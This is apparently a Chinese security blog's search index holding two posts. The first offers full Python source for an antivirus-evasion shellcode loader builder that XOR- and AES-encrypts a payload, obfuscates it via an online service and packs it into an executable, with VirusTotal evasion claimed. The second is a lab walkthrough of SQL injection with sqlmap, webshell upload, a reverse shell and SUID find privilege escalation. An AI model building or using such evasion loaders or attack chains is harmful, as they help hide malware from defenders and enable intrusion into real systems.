<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>“免杀shellcode加载器——加密混淆系列”</title>
    <link href="/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/"/>
    <url>/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<h3 id="Python加载shellcode免杀介绍"><a href="#Python加载shellcode免杀介绍" class="headerlink" title="Python加载shellcode免杀介绍"></a>Python加载shellcode免杀介绍</h3><p>Python的简单易用使得它成为了许多免杀工具的首选语言。它可以轻松地处理shellcode，进行加密和混淆。使用Python实现各种加密也相对简单，且免杀效果较好。但是，Python编译生成的exe文件较大，这是它唯一的不足之处（本文将介绍如何缩小Python代码）。<br>VirusTotal：<br><img src="/../images/20230324172413.png"><br>微步：<br><img src="/../images/20230324172811.png"></p><p>###加载器脚本源码介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs code"> import tkinter as tk<br>from tkinter import filedialog<br>import requests<br>import os<br>import re<br>import json<br>import base64<br>from Crypto.Cipher import AES<br>import python_minifier<br>from pathlib import Path<br>def add_to_16(s):<br>    while len(s) % 16 != 0:<br>        s += &#x27;\0&#x27;<br>    return str.encode(s)<br>def aes_jiami(text):<br>    key = &#x27;LeslieCheungKwok&#x27;<br>    aes = AES.new(add_to_16(key), AES.MODE_ECB)<br>    encrypted_text = str(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=&#x27;utf8&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)<br>    return encrypted_text<br>def xor_jiami(s, key):<br>    xor_s = &#x27;&#x27;<br>    for i in s:<br>        xor_s += chr(ord(i) ^ key)<br>    return xor_s<br>def compile():<br>    payload_path = entry1.get()<br>    with open(payload_path, &#x27;rb&#x27;) as f:<br>        data = f.read()<br>        b64_data = base64.b64encode(data)<br>    with open(&#x27;payload.bs64&#x27;, &#x27;wb&#x27;) as f:<br>        f.write(b64_data)<br>        sc = Path(&#x27;payload.bs64&#x27;).read_text()<br>    with open(&#x27;./aes-xor.txt&#x27;,&#x27;wb&#x27;) as f:<br>        f.write(aes_jiami(xor_jiami(sc, 35)).encode())<br>    with open(&#x27;aes-xor.txt&#x27;, &#x27;r&#x27;) as f:<br>        jiami_sc = f.read().strip()<br>    with open(&#x27;main.py&#x27;, &#x27;r&#x27;) as f:<br>        content = f.read()<br>    content = content.replace(&quot;jiami_sc = &#x27;&#x27;&quot;, f&quot;jiami_sc = &#x27;&#123;jiami_sc&#125;&#x27;&quot;)<br>    mini_content = python_minifier.minify(content)<br>    with open(&#x27;main-mini.py&#x27;, &#x27;w&#x27;) as f:<br>        f.write(mini_content)<br>    url = &quot;https://pyob.oxyry.com/obfuscate&quot;<br>    with open(&quot;main-mini.py&quot;, &quot;r&quot;) as f:<br>        source = f.read()<br><br>    payload = &#123;<br>      &quot;append_source&quot;: False,<br>      &quot;remove_docstrings&quot;: True,<br>      &quot;rename_nondefault_parameters&quot;: True,<br>      &quot;rename_default_parameters&quot;: False,<br>      &quot;preserve&quot;: &quot;&quot;,<br>      &quot;source&quot;: source<br>    &#125;<br>    headers = &#123;<br>      &quot;Content-Type&quot;: &quot;application/json&quot;,<br>      &quot;Referer&quot;: &quot;https://pyob.oxyry.com/&quot;,<br>      &quot;Origin&quot;: &quot;https://pyob.oxyry.com&quot;<br>    &#125;<br><br>    response = requests.post(url, json=payload, headers=headers)<br>    json_obj = json.loads(response.text)<br>    dest_value=json_obj[&#x27;dest&#x27;]<br>    with open(&quot;main-mini-obfuscated.py&quot;, &quot;w&quot;) as f:<br>       f.write(dest_value)<br>    os.rename(&quot;main-mini-obfuscated.py&quot;, &quot;main-mini-ob.py&quot;)<br>    print(response.text)<br>    os.system(&quot;pyinstaller.exe -Fw -i icon.ico --key=leslie --distpath=./dist main-mini-ob.py&quot;)<br>root = tk.Tk()<br>root.title(&quot;shallcode加载器v1.0&quot;)<br>root.geometry(&quot;400x200&quot;)<br>label1 = tk.Label(root, text=&quot;选择payload.raw的路径:&quot;)<br>label1.pack()<br>label2 = tk.Label(root, text=&quot;可执行文件将生成在当前文件夹&quot;)<br>label2.pack()<br>entry1 = tk.Entry(root)<br>entry1.pack()<br>button1 = tk.Button(root, text=&quot;raw&quot;, command=lambda: entry1.insert(tk.END, filedialog.askopenfilename()))<br>button2 = tk.Button(root, text=&quot;编译&quot;, command=compile)<br>label1.pack(side=tk.TOP, pady=10)<br>label2.pack(side=tk.TOP, pady=10)<br>entry1.pack(side=tk.TOP, pady=10)<br>button1.pack(side=tk.LEFT, padx=60)<br>button2.pack(side=tk.RIGHT, padx=60, anchor=&#x27;center&#x27;)<br>root.mainloop()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>对某靶机环境进行渗透测试</title>
    <link href="/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="此靶机根据某博彩网站的真实环境所搭建。"><a href="#此靶机根据某博彩网站的真实环境所搭建。" class="headerlink" title="此靶机根据某博彩网站的真实环境所搭建。"></a>此靶机根据某博彩网站的真实环境所搭建。</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>在VMwareWorkstation中导入虚拟机<br><img src="/../images/9c47491f80d2fe12fe91697501b1f82.png"></p><p>开启虚拟机并登陆root账号，并查看apache服务是否开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef |grep httpd<br>ps -aux | grep httpd<br></code></pre></td></tr></table></figure><p><img src="/../images/8108a693a1e75ef188444c52ad689fa.png"></p><p>查看ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/../images/a27143effacc23b122a0cd5c836d906.png"></p><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>进入登录界面<br><img src="/../images/101110.png"></p><p>注册账号并进入网站<br><img src="/../images/101529.png"></p><p>点击商品<br><img src="/../images/103447.png"></p><p>url：<a href="http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html">http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html</a></p><p>发现参数pid后面的数字为注入点,用sqlmap跑出管理员账号密码(在指定注入的位置加上*）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r target.txt  --prefix <span class="hljs-string">&quot;26)&quot;</span> --suffix <span class="hljs-string">&quot;%23&quot;</span> -D weipans -T wp_userinfo --dump<br></code></pre></td></tr></table></figure><p>target.txt内容:<br><img src="/../images/135657.png"></p><p>管理员密码的md5值:<br><img src="/../images/134520.png"></p><p>md5值解密：<br><img src="/../images/140639.png"></p><p>进入网站后台并在参数设置-基本设置处发现文件上传点:<br><img src="/../images/141259.png"></p><p>上传冰蝎马并通过查看页面源代码确定上传位置:<br><img src="/../images/143456.png"></p><p>连接冰蝎,利用命令执行反弹shell并利用suid提权:<br><img src="/../images/144813.png"></p><p>发现find有suid表示位，所以可以利用find提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 111<br>find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></td></tr></table></figure><p>提权成功：<br><img src="/../images/154129.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
